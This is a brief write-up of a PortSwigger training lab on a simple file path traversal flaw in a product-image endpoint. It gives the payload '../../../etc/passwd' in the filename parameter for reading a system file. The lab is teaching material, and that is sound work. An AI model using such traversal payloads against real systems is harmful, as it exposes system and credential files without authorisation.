# Lab: File path traversal, simple case (Apprentice)

**Lab:** [https://portswigger.net/web-security/file-path-traversal/lab-simple](https://portswigger.net/web-security/file-path-traversal/lab-simple)

**Task (from PortSwigger):**  
This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Vulnerability
`filename` is concatenated to the image base directory with no sanitization.

## Solution

1. Intercept a request that loads a product image (e.g. `/image?filename=...`).
2. Set:

```
filename=../../../etc/passwd
```

3. Response contains `/etc/passwd`.

## Final Payload
```
../../../etc/passwd
```
